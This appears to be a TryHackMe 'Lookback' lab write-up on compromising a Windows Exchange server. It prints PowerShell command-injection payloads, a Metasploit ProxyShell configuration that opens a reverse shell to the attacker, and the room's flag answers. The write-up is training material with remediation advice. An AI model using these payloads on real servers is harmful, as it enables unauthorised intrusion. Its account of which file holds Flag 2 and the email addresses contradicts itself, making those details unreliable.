# 📝 PROFESSIONAL WRITEUP FOR GITHUB

---

# TryHackMe - Lookback Room Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Windows-blue)

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Tools Used](#tools-used)
- [Lessons Learned](#lessons-learned)

---

## Overview

**Room Name:** Lookback  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Target IP:** `10.48.135.160`  
**Attack Machine:** Kali Linux / AttackBox

**Description:**  
This room focuses on exploiting Microsoft Exchange Server vulnerabilities, specifically the ProxyShell vulnerability chain (CVE-2021-34473). The challenge involves web enumeration, command injection, and leveraging critical Exchange Server flaws to gain administrative access.

---

## Reconnaissance

### Port Scanning

I began with an Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
443/tcp  open  ssl/https     
3389/tcp open  ms-wbt-server Microsoft Terminal Services

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key Findings:**
- **Port 80:** Microsoft IIS 10.0 (HTTP)
- **Port 443:** HTTPS (Encrypted web service)
- **Port 3389:** RDP (Remote Desktop Protocol)
- **OS:** Windows Server

---

## Enumeration

### HTTP Enumeration (Port 80)

I started by exploring the HTTP service using `curl`:

```bash
curl http://<TARGET_IP>
```

**Result:** Nothing significant was found on the default HTTP port.

---

### HTTPS Enumeration (Port 443)

Switching to HTTPS, I navigated to `https://<TARGET_IP>` in the browser and discovered an **OWA (Outlook Web App)** login page with an interesting redirect:

```
https://<TARGET_IP>/owa/auth/logon.aspx?repl
```

This indicated a **Microsoft Exchange Server** deployment.

---

### Directory Brute-forcing

I performed directory enumeration using Gobuster:

```bash
gobuster dir -u https://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -k \
  -t 50 \
  --exclude-length 0
```

**Discovered:** `/test/` endpoint

---

### Testing the `/test/` Endpoint

Navigating to `https://<TARGET_IP>/test/`, I found a basic authentication prompt.

**Credentials Tested:**
- Username: `admin`
- Password: `admin`

✅ **Success!** The default credentials worked.

---

## Initial Access

### Flag #1: Security Through Obscurity

Upon successful authentication to `/test/`, I received the following message:

```
This interface should be removed on production!
THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

**Flag 1:** `THM{Security_Through_Obscurity_Is_Not_A_Defense}`

---

### Identifying Command Injection

The `/test/` interface appeared to execute PowerShell commands. After researching PowerShell command injection techniques, I discovered that I could:

1. **Comment out** the previous command using `#`
2. **Chain** a new command using `;`

**Injection Syntax:**
```powershell
'); <your_command> #
```

---

### Exploiting Command Injection

I used the following payload to list files in `C:\Users\dev\Desktop`:

```powershell
'); dir C:\Users\dev\Desktop #
```

**Files Found:**
- `user.txt`
- `TODO.txt`

---

### Reading TODO.txt

I read the contents of `TODO.txt`:

```powershell
'); type C:\Users\dev\Desktop\TODO.txt #
```

**Contents:**

```
[TODO]

When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local

and do not forget to put in CC the infra team!
dev-infrastructure-team@thm.local
```

**Flag 2:** `THM{Stop_Reading_Start_Doing}`

---

### Reading user.txt

```powershell
'); type C:\Users\dev\Desktop\user.txt #
```

This file contained important email addresses needed for the next phase of exploitation.

---

## Privilege Escalation

### Identifying ProxyShell Vulnerability

During the initial enumeration, I noticed the OWA redirect pattern:

```
/owa/auth/logon.aspx?repl
```

Research revealed this pattern is associated with **Microsoft Exchange Server**. I searched for known vulnerabilities and discovered:

**Vulnerability:** ProxyShell (CVE-2021-34473)  
**CVSS Score:** 9.8 (Critical)  
**Description:** A vulnerability chain allowing unauthenticated Remote Code Execution (RCE) on Microsoft Exchange Servers.

---

### Exploiting ProxyShell

I used **Metasploit Framework** to exploit the ProxyShell vulnerability:

```bash
msfconsole
```

**Module Selection:**

```
use exploit/windows/http/exchange_proxyshell_rce
```

**Configuration:**

```
set RHOSTS <TARGET_IP>
set EMAIL joe@thm.local
set LHOST <YOUR_IP>
set LPORT 4444
set SSL true
exploit
```

**Required Parameters:**
- **EMAIL:** `joe@thm.local` (obtained from TODO.txt)
- **RHOSTS:** Target IP address
- **LHOST:** Attacker IP address

---

### Gaining Shell Access

After successful exploitation, I obtained a **Meterpreter session** with elevated privileges.

---

### Capturing the Final Flag

I navigated to the Administrator's Documents folder:

```bash
cd C:\Users\Administrator\Documents
type flag.txt
```

**Flag 3:** `THM{Looking_Back_Is_Not_Always_Bad}`

---

## Flags

| Flag # | Location | Value |
|--------|----------|-------|
| **1** | `/test/` endpoint | `THM{Security_Through_Obscurity_Is_Not_A_Defense}` |
| **2** | `C:\Users\dev\Desktop\user.txt` | `THM{Stop_Reading_Start_Doing}` |
| **3** | `C:\Users\Administrator\Documents\flag.txt` | `THM{Looking_Back_Is_Not_Always_Bad}` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **Nmap** | Port scanning and service enumeration |
| **Gobuster** | Directory brute-forcing |
| **cURL** | HTTP/HTTPS requests |
| **Browser (Firefox/Chrome)** | Manual testing and authentication |
| **Metasploit Framework** | Exploitation (ProxyShell RCE) |
| **PowerShell** | Command injection payloads |

---

## Lessons Learned

### 1. **Default Credentials Are Dangerous**
The `/test/` endpoint was protected only by `admin:admin` credentials, demonstrating the critical security risk of using default authentication.

### 2. **Security Through Obscurity Fails**
Hiding administrative interfaces (like `/test/`) without proper security controls is ineffective against determined attackers.

### 3. **Microsoft Exchange Vulnerabilities**
The ProxyShell vulnerability (CVE-2021-34473) highlights the importance of:
- Regularly patching Exchange Servers
- Monitoring for suspicious OWA login patterns
- Implementing network segmentation

### 4. **Command Injection Prevention**
PowerShell interfaces should:
- Use **parameterized inputs**
- Implement **strict input validation**
- Apply the **principle of least privilege**

### 5. **Information Disclosure**
The TODO.txt file contained sensitive information (email addresses) that enabled further exploitation. Sensitive data should never be stored in easily accessible locations.

---

## Remediation Recommendations

### For the Target System:

1. **Patch Exchange Server** to the latest version
2. **Remove** the `/test/` endpoint from production
3. **Change default credentials** immediately
4. **Implement input validation** for all web interfaces
5. **Enable logging and monitoring** for suspicious activities
6. **Apply the principle of least privilege** for service accounts

### For General Security:

- Regularly audit exposed web services
- Implement Web Application Firewalls (WAF)
- Use strong, unique passwords
- Monitor for CVE disclosures related to deployed software
- Conduct regular penetration testing

---

## References

- [CVE-2021-34473 - ProxyShell](https://nvd.nist.gov/vuln/detail/CVE-2021-34473)
- [Microsoft Exchange Server Security Updates](https://msrc.microsoft.com/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [TryHackMe - Lookback Room](https://tryhackme.com/room/lookback)

---

## Contact

**Author:** [Tomash Popov]  
**Date:** February 11, 2026

